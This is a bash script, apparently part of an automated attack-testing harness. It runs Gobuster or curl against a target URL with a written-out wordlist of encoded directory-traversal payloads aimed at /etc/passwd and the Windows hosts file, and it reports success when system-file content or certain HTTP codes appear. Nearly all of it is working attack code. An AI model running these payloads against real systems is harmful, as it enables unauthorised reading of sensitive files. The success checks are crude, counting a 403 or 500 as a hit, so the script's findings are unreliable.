#!/bin/bash

# Directory Traversal Attack Script using Gobuster
# Usage: ./attack_traversal.sh <target_url> <payload>

TARGET_URL="$1"
PAYLOAD="$2"

echo "  [REAL ATTACK] Using Gobuster for directory traversal testing..."

# Install Gobuster if not available
if ! command -v gobuster &> /dev/null; then
    echo "  [INFO] Installing Gobuster..."
    apt-get update && apt-get install -y gobuster || {
        echo "  [WARNING] Failed to install Gobuster, using curl fallback"
        # Fallback to curl-based traversal testing
        response=$(curl -s -w "%{http_code}" \
            -X "GET" \
            -H "User-Agent: attacker" \
            --max-time 10 \
            "$TARGET_URL")
        
        http_code=$(echo "$response" | tail -c 4)
        response_body=$(echo "$response" | head -c -4)
        
        # Check for directory traversal indicators
        traversal_success=false
        if echo "$response_body" | grep -q "root:.*:0:0:\|Windows.*System32\|BEGIN:VCARD"; then
            traversal_success=true
        fi
        
        if [[ "$traversal_success" == true || "$http_code" == "500" ]]; then
            echo "  [SUCCESS] Directory traversal successful - sensitive file content found (HTTP $http_code)"
            exit 0
        else
            echo "  [FAILED] Directory traversal failed - no sensitive content (HTTP $http_code)"
            exit 1
        fi
    }
fi

# Create a simple wordlist for testing
cat > /tmp/traversal_wordlist.txt << EOF
../../../../etc/passwd
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252f..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
....//....//....//etc/passwd
..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
EOF

# Run Gobuster
echo "  [INFO] Running Gobuster against: $TARGET_URL"
gobuster_output=$(timeout 30 gobuster dir \
    -u "$TARGET_URL" \
    -w /tmp/traversal_wordlist.txt \
    -t 1 \
    --timeout 10s \
    --no-error \
    2>&1)

# Check Gobuster results
traversal_found=false
if echo "$gobuster_output" | grep -q "Status: 200\|Status: 403\|Status: 500"; then
    traversal_found=true
fi

# Also get HTTP status for verification
curl_response=$(curl -s -w "%{http_code}" \
    -X "GET" \
    -H "User-Agent: attacker" \
    --max-time 10 \
    "$TARGET_URL")

http_code=$(echo "$curl_response" | tail -c 4)

# Save Gobuster output
echo "$gobuster_output" > "/tmp/gobuster_output.txt"

# Determine success
if [ "$traversal_found" = true ] || [ "$http_code" = "500" ]; then
    echo "  [SUCCESS] Directory traversal detected by Gobuster (HTTP $http_code)"
    echo "  [TOOL_OUTPUT] /tmp/gobuster_output.txt"
    exit 0
else
    echo "  [FAILED] No directory traversal detected (HTTP $http_code)"
    exit 1
fi 